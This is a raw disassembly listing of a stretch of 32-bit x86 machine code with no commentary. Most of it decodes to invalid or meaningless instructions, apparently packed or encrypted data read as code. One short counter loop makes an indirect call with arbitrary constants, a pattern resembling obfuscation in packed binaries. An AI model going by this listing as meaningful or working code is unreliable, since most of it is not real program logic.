  404820:	sbb    cl,BYTE PTR [ebp-0x3e]
  404823:	fwait
  404824:	into   
  404825:	ja     0x4047ba
  404827:	cmp    ebx,eax
  404829:	add    cl,0x34
  40482c:	repnz cmp cl,BYTE PTR [edi-0x4e]
  404830:	mov    ds:0xc96f25a5,al
  404835:	sahf   
  404836:	cmp    DWORD PTR [eax+ebx*8-0x4b],ebp
  40483a:	gs mov bh,0x1
  40483d:	std    
  40483e:	mov    dh,0xcb
  404840:	retf   0xe7bb
  404843:	mov    ebx,0xeb3e7517
  404848:	mov    ebp,0x733f5aef
  40484d:	push   esi
  40484e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40484f:	push   eax
  404850:	jbe    0x4048c5
  404852:	add    eax,0x4fdc1b63
  404857:	sub    eax,0x3616a7ba
  40485c:	xchg   ecx,eax
  40485d:	imul   ebp,DWORD PTR [eax+0x64],0xffffffc2
  404861:	loope  0x40487f
  404863:	jns    0x404809
  404865:	cwde   
  404866:	jns    0x404814
  404868:	loope  0x4048c2
  40486a:	clc    
  40486b:	and    DWORD PTR [edx],eax
  40486d:	(bad)  
  40486e:	jae    0x40488c
  404870:	jle    0x404843
  404872:	mov    ds:0x6c6136e2,al
  404877:	out    dx,al
  404878:	(bad)  
  404879:	stos   BYTE PTR es:[edi],al
  40487a:	les    ebp,FWORD PTR [esp+edi*1-0x64]
  40487e:	xlat   BYTE PTR ds:[ebx]
  40487f:	pop    eax
  404880:	lods   eax,DWORD PTR ds:[esi]
  404881:	dec    ebp
  404882:	(bad)  
  404884:	hlt    
  404885:	cs pusha 
  404887:	xchg   edx,eax
  404888:	out    0xfb,eax
  40488a:	lods   al,BYTE PTR ds:[esi]
  40488b:	xchg   ecx,eax
  40488c:	popf   
  40488d:	jp     0x40484b
  40488f:	in     eax,dx
  404890:	fdivr  QWORD PTR [ebp-0x10b6f92]
  404896:	(bad)  
  404897:	sub    ebx,DWORD PTR [ecx-0x57]
  40489a:	dec    eax
  40489b:	sub    dh,BYTE PTR [ebp-0x6ed0ead2]
  4048a1:	sub    cl,0x75
  4048a4:	ins    DWORD PTR es:[edi],dx
  4048a5:	(bad)  
  4048a6:	mov    bh,0xe2
  4048a8:	pop    ds
  4048a9:	jns    0x4048c8
  4048ab:	mov    WORD PTR [esi],cs
  4048ad:	(bad)  
  4048ae:	outs   dx,BYTE PTR ds:[esi]
  4048af:	sub    ah,BYTE PTR [edx]
  4048b1:	mov    al,ds:0xa288befe
  4048b6:	lds    edx,FWORD PTR [ebp+0x0]
  4048b9:	sub    eax,0xbcd08885
  4048be:	shl    BYTE PTR [ecx+ebp*4],cl
  4048c1:	add    ecx,DWORD PTR [eax+0x7c0edce0]
  4048c7:	add    BYTE PTR [ecx+0x63],al
  4048ca:	sub    esp,DWORD PTR [edx+0x4e708b5b]
  4048d0:	fisub  WORD PTR [eax-0x11]
  4048d3:	mov    esp,0x87454bdb
  4048d8:	mov    al,0x83
  4048da:	push   eax
  4048db:	dec    ebp
  4048dc:	das    
  4048dd:	sub    BYTE PTR [edi+eiz*8],bh
  4048e0:	gs fs stos BYTE PTR es:[edi],al
  4048e3:	mov    ah,0x7b
  4048e5:	leave  
  4048e6:	out    dx,al
  4048e7:	std    
  4048e8:	das    
  4048e9:	mov    WORD PTR [ecx],es
  4048eb:	push   ss
  4048ec:	jmp    0xab3f9794
  4048f1:	in     eax,0xb6
  4048f3:	arpl   WORD PTR [ebx-0x7bf04fa4],bx
  4048f9:	gs pop edx
  4048fb:	dec    ebx
  4048fc:	xlat   BYTE PTR ds:[ebx]
  4048fd:	shl    DWORD PTR [edi+0x3f],0xd6
  404901:	jnp    0x40488e
  404903:	add    al,0x3c
  404905:	scas   al,BYTE PTR es:[edi]
  404906:	pop    edx
  404907:	pop    esp
  404908:	adc    DWORD PTR ds:0x4672ab7d,edx
  40490e:	xchg   ecx,eax
  40490f:	(bad)
  404912:	inc    eax
  404913:	sbb    esi,DWORD PTR [ecx+0x4cfc6934]
  404919:	push   eax
  40491a:	nop
  40491b:	into   
  40491c:	scas   al,BYTE PTR es:[edi]
  40491d:	outs   dx,BYTE PTR ds:[esi]
  40491e:	or     eax,0xacdbb46f
  404923:	into   
  404924:	shl    esp,0xef
  404927:	les    esi,FWORD PTR [esi+ebx*8-0x1f]
  40492b:	in     al,0x57
  40492d:	popf   
  40492e:	jmp    0x40493a
  404930:	pop    es
  404931:	retf   
  404932:	hlt    
  404933:	into   
  404934:	in     eax,dx
  404935:	adc    esi,DWORD PTR [edx-0x1986c9af]
  40493b:	sahf   
  40493c:	test   DWORD PTR [esi+0x10345ee7],eax
  404942:	inc    ebp
  404943:	in     al,dx
  404944:	sbb    eax,0x219a781d
  404949:	cli    
  40494a:	jne    0x40499a
  40494c:	inc    edx
  40494d:	icebp  
  40494e:	pop    edi
  40494f:	cli    
  404950:	mov    ah,BYTE PTR [ebx]
  404952:	shl    DWORD PTR [esi-0x7a],1
  404955:	(bad)  
  404956:	sub    DWORD PTR [esi-0x7c],ebx
  404959:	aad    0x8d
  40495b:	test   DWORD PTR [esi+0x2c],esi
  40495e:	psubw  mm6,mm5
  404961:	jo     0x40495b
  404963:	mov    BYTE PTR ss:[eax+0xa920f58],ah
  40496a:	push   es
  40496b:	jo     0x40498d
  40496d:	lods   al,BYTE PTR ds:[esi]
  40496e:	dec    esi
  40496f:	pop    edi
  404970:	and    al,0xf9
  404972:	jmp    0x4049ab
  404974:	mov    al,0x5d
  404976:	and    al,0xba
  404979:	nop
  40497a:	fs pusha 
  40497c:	vpmaddwd xmm3,xmm1,XMMWORD PTR [ebx]
  404980:	jmp    0x404974
  404982:	cmc    
  404983:	nop
  404984:	call   0x82b9:0xaf43b8a8
  40498b:	jno    0x404a01
  40498d:	xor    edx,DWORD PTR [edi+esi*2-0x54f7a550]
  404994:	cmp    eax,0x55cd5899
  404999:	xor    cl,BYTE PTR [edx+0x12b758e0]
  40499f:	mov    al,ds:0xf631c44e
  4049a4:	inc    ecx
  4049a5:	shl    BYTE PTR fs:[edx+0x7f],0xc5
  4049aa:	dec    ebp
  4049ab:	in     al,dx
  4049ac:	mov    ds,WORD PTR [edi+0x7c29e2b2]
  4049b2:	sub    al,0x5f
  4049b4:	xchg   BYTE PTR [edx],ch
  4049b6:	data16 mov al,0xd8
  4049b9:	dec    eax
  4049ba:	test   BYTE PTR [ebx+0x26],dl
  4049bd:	pop    es
  4049be:	gs outs dx,DWORD PTR gs:[esi]
  4049c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049c2:	or     al,0xa6
  4049c4:	inc    ebx
  4049c5:	out    dx,al
  4049c6:	mov    dl,0x95
  4049c8:	xchg   ebp,eax
  4049c9:	xor    eax,0x4b1489ea
  4049ce:	les    ebx,FWORD PTR [ecx+0xe]
  4049d1:	fst    DWORD PTR [esi-0x71]
  4049d4:	cmp    BYTE PTR [ebx-0x6bce465f],bl
  4049da:	pop    ss
  4049db:	jb     0x40497f
  4049dd:	dec    esi
  4049de:	in     eax,dx
  4049df:	addr16 or al,0x8a
  4049e2:	xor    BYTE PTR ds:0x65988a89,bl
  4049e8:	mov    ch,0x3e
  4049ea:	push   ebp
  4049eb:	jns    0x404a23
  4049ed:	inc    ebx
  4049ee:	jle    0x404a36
  4049f0:	adc    BYTE PTR [esi+0x60],al
  4049f3:	pop    esi
  4049f4:	xchg   edx,eax
  4049f5:	out    dx,eax
  4049f6:	sahf   
  4049f7:	mov    cl,0xdd
  4049f9:	xchg   esi,eax
  4049fa:	jmp    0xda37e249
  4049ff:	cmp    eax,ecx
  404a01:	sbb    BYTE PTR [edi-0x48],cl
  404a04:	and    edi,DWORD PTR [edx+0x2a553b5d]
  404a0a:	rol    DWORD PTR [ebp-0x4adac2cc],1
  404a10:	dec    esp
  404a11:	adc    DWORD PTR [edi+0x10f74e66],esp
  404a17:	sbb    eax,0x5b75e61
  404a1c:	push   ebx
  404a1d:	jne    0x4049ed
  404a1f:	adc    eax,0xb8044a57
  404a24:	push   ecx
  404a25:	pop    ss
  404a26:	pop    edi
  404a27:	pop    ebp
  404a28:	lock jo 0x404a7b
  404a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a2c:	push   es
  404a2d:	sbb    DWORD PTR [esi],0xffffffcf
  404a30:	adc    dh,cl
  404a32:	mov    dl,0xd
  404a34:	arpl   WORD PTR [edx-0x74],bx
  404a37:	pop    edx
  404a38:	lods   eax,DWORD PTR ds:[esi]
  404a39:	(bad)  
  404a3a:	mov    ebp,0xc46b2d18
  404a3f:	adc    ecx,esp
  404a41:	adc    cl,BYTE PTR [eax-0x4a]
  404a44:	jne    0x404a4c
  404a46:	xor    eax,0xa5d7fceb
  404a4b:	or     DWORD PTR [ecx+edi*4+0x7510850],esi
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	inc    esi
  404ae3:	jbe    0x404aba
  404ae5:	test   al,0x46
  404ae7:	cs js  0x404b62
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404b28
  404aef:	jmp    0xe420:0x776ddc70
  404af6:	aam    0x4b
  404af8:	and    eax,0x4009a9ae
  404afd:	lods   eax,DWORD PTR ds:[esi]
  404afe:	aaa    
  404aff:	div    BYTE PTR [edi+0x2d873eae]
  404b05:	imul   ecx,DWORD PTR [eax+ebx*4-0x6b2ccca4],0x28
  404b0d:	cmp    eax,edx
  404b0f:	mov    esp,0x592c53e1
  404b14:	jle    0x404b6a
  404b16:	pop    esp
  404b17:	cs aaa 
  404b19:	push   edi
  404b1a:	mov    esi,ecx
  404b1c:	sti    
  404b1d:	dec    edx
  404b1e:	repz push eax
  404b20:	sub    eax,0x4ad62108
  404b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b26:	cli    
  404b27:	sub    eax,0xdfe9549
  404b2c:	out    0xdc,eax
  404b2e:	add    BYTE PTR [eax],0xc0
  404b31:	mov    dl,0x61
  404b33:	fistp  WORD PTR [ebp+0x134c8d39]
  404b39:	test   DWORD PTR [esi-0x3ffe8275],ebp
  404b3f:	cmp    ch,al
  404b41:	xor    ch,BYTE PTR [eax]
  404b43:	pusha  
  404b44:	adc    al,0x7b
  404b46:	mov    edi,cs
  404b48:	sbb    eax,0x6698f335
  404b4d:	add    bh,BYTE PTR [edi-0x643414ef]
  404b53:	aas    
  404b54:	or     eax,0x83f90548
  404b59:	pusha  
  404b5a:	enter  0xfeba,0x32
  404b5e:	xor    al,0x35
  404b60:	mov    ?,WORD PTR [esi]
  404b62:	mov    bl,0x91
  404b64:	aad    0x45
  404b66:	lods   al,BYTE PTR ds:[esi]
  404b67:	in     al,dx
  404b68:	int    0x7f
  404b6a:	dec    ebx
  404b6b:	rol    DWORD PTR [bx],0x6f
  404b6f:	push   edi
  404b70:	rcr    BYTE PTR [ebx-0x7c],0x87
  404b74:	mov    dl,0x28
  404b76:	and    eax,0xf9aa71e7
  404b7b:	(bad)  
  404b7c:	push   edi
  404b7d:	jmp    0x404b54
  404b7f:	inc    edx
  404b80:	daa    
  404b81:	dec    esp
  404b82:	mov    ah,0x43
  404b84:	and    BYTE PTR [edx],dh
  404b86:	ficomp WORD PTR [ebp-0x76de539a]
  404b8c:	xchg   BYTE PTR [ecx],cl
  404b8e:	push   ecx
  404b8f:	sbb    ebp,DWORD PTR [ebp-0x7af227e4]
  404b95:	add    BYTE PTR [esi+eiz*4-0x3c],dh
  404b99:	(bad)  
  404b9a:	leave  
  404b9b:	mov    edi,0xb6d65c54
  404ba0:	ror    BYTE PTR [eax+0x702e6953],cl
  404ba6:	mov    ebp,DWORD PTR [edi]
  404ba8:	ficomp DWORD PTR [edx-0x7d]
  404bab:	lods   eax,DWORD PTR ds:[esi]
  404bac:	xchg   esp,eax
  404bad:	pop    esp
  404bae:	mov    ?,WORD PTR cs:[ebx-0x1]
  404bb2:	daa    
  404bb3:	fs lock pop es
  404bb6:	ja     0x404b63
  404bb8:	jbe    0x404c13
  404bba:	mov    cl,0xf3
  404bbc:	sub    esp,edi
  404bbe:	mov    ds:0x345b079,eax
  404bc3:	xor    DWORD PTR ds:[ecx+0x70],ebp
  404bc7:	popa   
  404bc8:	fs cli 
  404bca:	xor    BYTE PTR ds:[esi-0x10],bh
  404bce:	push   esp
  404bcf:	jmp    0x404bd7
  404bd1:	jp     0x404c14
  404bd3:	popf   
  404bd4:	int3   
  404bd5:	mov    DWORD PTR [ebx+0x60],ebp
  404bd8:	jle    0x404c1e
  404bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bdb:	mov    bl,0x6a
  404bdd:	scas   eax,DWORD PTR es:[edi]
  404bde:	popa   
  404bdf:	in     eax,0x2
  404be1:	mov    ecx,0x476a47fe
  404be6:	das    
  404be7:	(bad)  
  404be8:	aad    0x4c
  404bea:	pop    ebx
  404beb:	xor    DWORD PTR [edi+0x6c],ebp
  404bee:	ror    BYTE PTR [eax+ecx*8],1
  404bf1:	dec    edi
  404bf2:	ror    eax,0x1
  404bf5:	repz fwait
  404bf7:	xchg   edx,eax
  404bf8:	mov    ecx,0xf34745c3
  404bfd:	fcom   QWORD PTR [ebx+edi*4+0x2abbb130]
  404c04:	sbb    eax,0x99c63bad
  404c09:	dec    esp
  404c0a:	fwait
  404c0b:	inc    edi
  404c0c:	stos   BYTE PTR es:[edi],al
  404c0d:	jno    0x404c21
  404c0f:	push   es
  404c10:	jbe    0x404c72
  404c12:	int    0x5a
  404c14:	dec    ebx
  404c15:	mov    al,0x3d
  404c17:	push   ecx
  404c18:	inc    esp
  404c19:	adc    DWORD PTR [ebx+esi*2+0x32],ebx
  404c1d:	cmp    bh,0xfb
  404c20:	inc    esp
  404c21:	xchg   edx,eax
  404c22:	ins    DWORD PTR es:[edi],dx
  404c23:	xor    eax,DWORD PTR [edx-0x15a4e623]
  404c29:	(bad)  
  404c2a:	mov    ebp,0x883c4000
  404c2f:	std    
  404c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c31:	jle    0x404bdd
  404c33:	cmp    BYTE PTR [eax],0xd4
  404c36:	lods   al,BYTE PTR ds:[esi]
  404c37:	sbb    ecx,0xffffff87
  404c3a:	mov    bh,0x7e
  404c3c:	in     al,0x69
  404c3e:	mov    esi,0x61390bf9
  404c43:	call   0xb8a7:0x45af4e6e
  404c4a:	mov    cs,WORD PTR [ebp+0x41]
  404c4d:	dec    ecx
  404c4e:	add    edx,ecx
  404c50:	sub    BYTE PTR [eax-0x2befefbb],dl
  404c56:	outs   dx,DWORD PTR ds:[esi]
  404c57:	adc    ebp,DWORD PTR [edx-0x5c]
  404c5a:	mov    BYTE PTR [eax+ebx*8],ah
  404c5d:	test   BYTE PTR [esp+eax*8+0xfb4823a],ah
  404c64:	(bad)  
  404c65:	cmp    BYTE PTR [eax],dl
  404c67:	mov    dl,0x93
  404c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c6a:	outs   dx,DWORD PTR ds:[esi]
  404c6b:	inc    ecx
  404c6c:	mov    sp,0xeefa
  404c70:	mov    fs:0x60eb0a25,eax
  404c76:	addr16 jmp 0x404c89
  404c79:	jb     0x404c7e
  404c7b:	adc    DWORD PTR [edx+eiz*4-0x5f],ebx
  404c7f:	pushf  
  404c80:	out    dx,eax
  404c81:	sti    
  404c82:	mov    eax,ebp
  404c84:	fst    DWORD PTR [ebp+0xf]
  404c87:	mov    ch,0x87
  404c89:	dec    edi
  404c8a:	imul   edx,DWORD PTR [esp+edi*8+0x79371832],0xbe13841c
  404c95:	push   0xffffffc3
  404c97:	sub    eax,0x51b9e735
  404c9c:	pop    es
  404c9d:	shl    DWORD PTR gs:[edi+0x3],cl
  404ca1:	repnz std 
  404ca3:	jae    0x404c3d
  404ca5:	cmp    al,dl
  404ca7:	pop    eax
  404ca8:	sar    DWORD PTR [esp+esi*1],cl
  404cab:	adc    BYTE PTR [ebx],cl
  404cad:	shr    BYTE PTR [ecx],0x5f
  404cb0:	mov    eax,ds:0x77e913eb
  404cb5:	fsubr  st,st(4)
  404cb7:	push   ebp
  404cb8:	xlat   BYTE PTR ds:[ebx]
  404cb9:	les    esi,FWORD PTR [esi-0x5161a334]
  404cbf:	xchg   DWORD PTR [ebx-0x777f127a],ebx
  404cc5:	pop    ecx
  404cc6:	xlat   BYTE PTR ds:[ebx]
  404cc7:	mov    ds:0xc583b12c,al
  404ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ccd:	pushf  
  404cce:	and    ch,cl
  404cd0:	push   esp
  404cd1:	fsub   st(6),st
  404cd3:	or     DWORD PTR [ebp-0x2fecb9b1],edi
  404cd9:	ficomp WORD PTR [ebx]
  404cdb:	pop    ebp
  404cdc:	mov    DWORD PTR ds:[ebp+0x133c593b],ecx
  404ce3:	repz xor eax,esi
  404ce6:	mov    al,0xff
  404ce8:	popa   
  404ce9:	dec    esi
  404cea:	ds call 0x19ffe9cb
  404cf0:	or     eax,0x179cf558
  404cf5:	out    0xe4,al
  404cf7:	adc    edx,ecx
  404cf9:	inc    eax
  404cfa:	test   BYTE PTR [eax+0x5e4bbb61],0x2f
  404d01:	add    eax,DWORD PTR [ebx+0x64cfafe0]
  404d07:	mov    dh,0x68
  404d09:	aas    
  404d0a:	sub    eax,0x6f85ab0b
  404d0f:	push   ss
  404d10:	fnstcw WORD PTR [edx+0x2]
  404d13:	mov    ecx,0x9dc0d1f8
  404d18:	adc    eax,0x1776f9ab
  404d1d:	aad    0x1a
  404d1f:	bound  edx,QWORD PTR [ecx-0x7bf07928]
  404d25:	cmp    DWORD PTR [esi+0xb201e08],esi
  404d2b:	std    
  404d2c:	push   0x56
  404d2e:	cmp    edi,eax
  404d30:	and    al,0xb0
  404d32:	xor    dl,BYTE PTR [eax-0x3cdbf1b7]
  404d38:	push   eax
  404d39:	in     al,dx
  404d3a:	mov    al,0x6b
  404d3c:	gs sar cl,1
  404d3f:	mov    cl,0x8a
  404d41:	or     ebx,eax
  404d43:	jo     0x404d6d
  404d45:	sahf   
  404d46:	(bad)  
  404d48:	dec    esi
  404d49:	sub    al,0xaa
  404d4b:	dec    edi
  404d4c:	jp     0x404d73
  404d4e:	or     ebp,esi
  404d50:	push   ecx
  404d51:	or     bl,BYTE PTR [esi-0x10]
  404d54:	jecxz  0x404cf8
  404d56:	mov    ebx,0x6d2e4838
  404d5b:	(bad)
  404d5e:	mov    bl,0x4
  404d60:	push   ebx
  404d61:	fidiv  DWORD PTR [edi+0x1e]
  404d64:	sub    al,0xfe
  404d66:	pop    edx
  404d67:	add    esp,DWORD PTR [ebx]
  404d69:	stos   DWORD PTR es:[edi],eax
  404d6a:	sbb    al,0x6e
  404d6c:	mov    bh,0x19
  404d6e:	ret    0xa44c
  404d71:	pop    ecx
  404d72:	push   edi
  404d73:	(bad)
  404d76:	setle  BYTE PTR [edi]
  404d79:	push   0x7c
  404d7b:	dec    ecx
  404d7c:	cmp    al,0xa6
  404d7e:	jl     0x404d30
  404d80:	ret    
  404d81:	ret    0xd20b
  404d84:	add    DWORD PTR [eax],ecx
  404d86:	out    dx,eax
  404d87:	jmp    0xde6d5ba7
  404d8c:	cmp    al,0x62
  404d8e:	jp     0x404d4a
  404d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d91:	pop    ds
  404d92:	call   0xfcd2bce5
  404d97:	ret    0xa525
  404d9a:	jle    0x404da3
  404d9c:	mov    ecx,0xda4e98d2
  404da1:	imul   ebp,DWORD PTR [edx+0x14072782],0x8e96d35
  404dab:	cli    
  404dac:	repnz loop 0x404e25
  404daf:	repz push esi
  404db1:	push   ss
  404db2:	jg     0x404d85
  404db4:	mov    esp,0x352eddf7
  404db9:	imul   eax,ebx,0x5111c57d
  404dbf:	add    al,0xac
  404dc1:	push   edi
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	(bad)  
  404de9:	mov    dl,0x3d
  404deb:	mov    edx,0x7878339b
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404dfe
  404df5:	test   DWORD PTR [edx],edx
  404df7:	fs mov edx,0xf8ade695
  404dfd:	push   esp
  404dfe:	pop    ds
  404dff:	push   esi
  404e00:	mov    cl,0x5f
  404e02:	push   ecx
  404e03:	rol    DWORD PTR [edi],0x64
  404e06:	sub    al,0x89
  404e08:	mov    bh,0x46
  404e0a:	sbb    BYTE PTR [ebx+0x59],ch
  404e0d:	push   cs
  404e0e:	xchg   esp,eax
  404e0f:	inc    ecx
  404e10:	mov    ch,BYTE PTR [ebx]
  404e12:	int3   
  404e13:	mov    ds:0x822a9fdc,eax
  404e18:	ret    
  404e19:	mov    al,0xc5
  404e1b:	dec    ecx
  404e1c:	inc    ecx
  404e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e1e:	lock cmp DWORD PTR [ecx-0x1f24bec5],esi
  404e25:	add    eax,0x18d917f5
  404e2a:	add    BYTE PTR [ecx-0x45e10a10],dl
  404e30:	mov    ch,BYTE PTR [edx+0x25]
  404e33:	sbb    DWORD PTR [edx+0x1d],ebx
  404e36:	push   es
  404e37:	clc    
  404e38:	test   eax,0x38647445
  404e3d:	fwait
  404e3e:	adc    al,0x33
  404e40:	mov    BYTE PTR [edi+0x4d],bl
  404e43:	dec    esi
  404e44:	ss pusha 
  404e46:	xchg   DWORD PTR [eax-0x46],esp
  404e49:	iret   
  404e4a:	inc    ecx
  404e4b:	outs   dx,BYTE PTR ds:[esi]
  404e4c:	or     al,0xf0
  404e4e:	(bad)  
  404e4f:	cmp    al,0xc9
  404e51:	call   0x93ed5a66
  404e56:	dec    esp
  404e57:	(bad)  
  404e58:	mov    ebx,0x1503b3cb
  404e5d:	cmp    eax,0xcc775ede
  404e62:	add    al,0x3f
  404e64:	mov    bl,0x94
  404e66:	dec    ebp
  404e67:	enter  0xf73e,0xa9
  404e6b:	(bad)  
  404e6d:	loope  0x404ed7
  404e6f:	push   eax
  404e70:	stos   BYTE PTR es:[edi],al
  404e71:	fldl2t 
  404e73:	and    ah,BYTE PTR ds:[eax+0x43598247]
  404e7a:	xor    ebx,DWORD PTR [ebx]
  404e7c:	(bad)  
  404e7d:	sbb    eax,0xba43d152
  404e82:	scas   al,BYTE PTR es:[edi]
  404e83:	outs   dx,DWORD PTR ds:[esi]
  404e84:	jmp    0x9fa7:0x9a311205
  404e8b:	jbe    0x404e12
  404e8d:	adc    al,0x89
  404e8f:	je     0x404e53
  404e91:	addr16 aad 0xf0
  404e94:	scas   al,BYTE PTR es:[edi]
  404e95:	adc    edi,DWORD PTR [esi-0xbe09490]
  404e9b:	inc    ebp
  404e9c:	mov    eax,ds:0x4719a878
  404ea1:	fcom   DWORD PTR [ebp+0x6343a507]
  404ea7:	mov    eax,0x5a8ce93d
  404eac:	sbb    al,0xd0
  404eae:	mov    edx,0xbd71247b
  404eb3:	adc    eax,0xff4145a8
  404eb8:	lea    eax,[esi+0x6602b04b]
  404ebe:	out    0xfb,eax
  404ec0:	mov    ecx,0x67597182
  404ec5:	ins    DWORD PTR es:[edi],dx
  404ec6:	or     edx,DWORD PTR [edx+0x5e]
  404ec9:	pushf  
  404eca:	lahf   
  404ecb:	pop    esi
  404ecc:	and    eax,0x3e1b40f7
  404ed1:	cld    
  404ed2:	imul   edi,DWORD PTR [edi],0x48
  404ed5:	sub    BYTE PTR ds:0x53a8f2a8,bl
  404edb:	cmp    bl,bl
  404edd:	or     BYTE PTR [esi+0x61197184],bl
  404ee3:	dec    ecx
  404ee4:	aam    0xde
  404ee6:	(bad)
  404eea:	sbb    DWORD PTR [edi-0x3d3881cd],edi
  404ef0:	ret    
  404ef1:	sbb    DWORD PTR [ebp-0x9e02d07],0xffffffd9
  404ef8:	push   esp
  404ef9:	int    0x16
  404efb:	(bad)  
  404efc:	mov    sp,0xf98c
  404f00:	(bad)  
  404f01:	hlt    
  404f02:	xor    ecx,DWORD PTR [ebx]
  404f04:	mov    esp,0xf55cf9e5
  404f09:	push   ebp
  404f0a:	lock loope 0x404f71
  404f0d:	and    al,0x48
  404f0f:	pop    ecx
  404f10:	daa    
  404f11:	add    eax,0xec578fde
  404f16:	pop    ebx
  404f17:	mov    al,ds:0x95481422
  404f1c:	out    dx,eax
  404f1d:	and    BYTE PTR [esi],dl
  404f1f:	rcr    DWORD PTR [eax+edi*8-0xe8602aa],1
  404f26:	xchg   ebp,eax
  404f27:	and    eax,DWORD PTR [ebp+0x2386b805]
  404f2d:	popf   
  404f2e:	dec    edx
  404f2f:	loop   0x404f8c
  404f31:	leave  
  404f32:	mov    bh,0x7f
  404f34:	lahf   
  404f35:	cmp    al,0x82
  404f37:	cmp    BYTE PTR [edx+0x7f53cd2a],ah
  404f3d:	xchg   edi,eax
  404f3e:	pop    ebx
  404f3f:	lahf   
  404f40:	daa    
  404f41:	into   
  404f42:	xchg   BYTE PTR [ecx+0x1e],bl
  404f45:	inc    ecx
  404f46:	or     ebp,ecx
  404f48:	mov    ds:0x2f0794d5,eax
  404f4d:	push   cs
  404f4e:	je     0x404f02
  404f50:	shl    DWORD PTR [ecx+0x4b],cl
  404f53:	and    edi,ecx
  404f55:	xor    DWORD PTR [edx-0x5809115],esp
  404f5b:	and    dl,ah
  404f5d:	lods   al,BYTE PTR ds:[esi]
  404f5e:	aas    
  404f5f:	pop    es
  404f60:	test   al,0xbd
  404f62:	test   DWORD PTR [eax+edi*4+0x12f21f08],edx
  404f69:	out    0x5a,al
  404f6b:	add    ecx,ebp
  404f6d:	data16 loope 0x404f9c
  404f70:	aam    0xae
  404f72:	push   esi
  404f73:	fnstenv [eax+0xf]
  404f76:	xor    al,0xba
  404f78:	mov    bl,0xa3
  404f7a:	shl    ecx,1
  404f7c:	std    
  404f7d:	or     ecx,DWORD PTR [ecx]
  404f7f:	popa   
  404f80:	enter  0xf7cd,0x45
  404f84:	push   0x1b290607
  404f89:	adc    al,0xdf
  404f8b:	jo     0x404f65
  404f8d:	ins    DWORD PTR es:[edi],dx
  404f8e:	leave  
  404f8f:	mov    esi,0xa5fe1237
  404f94:	sbb    BYTE PTR [esi+ebx*8-0x5],bh
  404f98:	fwait
  404f99:	enter  0xa11e,0x7e
  404f9d:	adc    al,0x0
  404f9f:	stos   BYTE PTR es:[edi],al
  404fa0:	jp     0x404fde
  404fa2:	jbe    0x405000
  404fa4:	mov    ah,0x44
  404fa6:	scas   eax,DWORD PTR es:[edi]
  404fa7:	adc    ebx,DWORD PTR [edx+ecx*2+0x32c8ad38]
  404fae:	mov    cl,0xec
  404fb0:	aaa    
  404fb1:	(bad)  
  404fb2:	in     eax,0x26
  404fb4:	rcl    BYTE PTR [esi-0x3d],0xa5
  404fb8:	dec    esp
  404fb9:	or     eax,0x49bbd144
  404fbe:	out    dx,al
  404fbf:	and    DWORD PTR [ecx-0x5c026422],ebx
  404fc5:	fwait
  404fc6:	mov    esp,DWORD PTR [edi-0x4b993462]
  404fcc:	jle    0x404ffa
  404fce:	pop    esp
  404fcf:	cs retf 0x8e8a
  404fd3:	xor    dh,BYTE PTR [edi+0x37]
  404fd6:	mov    eax,ds:0x779b8479
  404fdb:	outs   dx,DWORD PTR ds:[esi]
  404fdc:	jle    0x40502e
  404fde:	mov    dh,0x2e
  404fe0:	inc    ebp
  404fe1:	mov    ch,0xa4
  404fe3:	cmp    esp,ebx
  404fe5:	mov    ds:0x27c81fcc,al
  404fea:	hlt    
  404feb:	xchg   ebp,eax
  404fec:	ins    DWORD PTR es:[edi],dx
  404fed:	and    eax,0x6c1feba0
  404ff2:	cmp    edx,ecx
  404ff4:	cld    
  404ff5:	shr    BYTE PTR [ebp-0x47bab9c4],0x2b
  404ffc:	cdq    
  404ffd:	mov    dh,0xa9
  404fff:	lods   eax,DWORD PTR ds:[esi]
  405000:	in     eax,dx
  405001:	retf   0x7eed
  405004:	fdivr  DWORD PTR [edx]
  405006:	jnp    0x404ff6
  405008:	xchg   ebp,eax
  405009:	xor    BYTE PTR [edx-0x34],0xc7
  40500d:	jnp    0x404fa7
  40500f:	pop    eax
  405010:	xchg   edi,eax
  405011:	pop    eax
  405012:	int    0x8f
  405014:	cli    
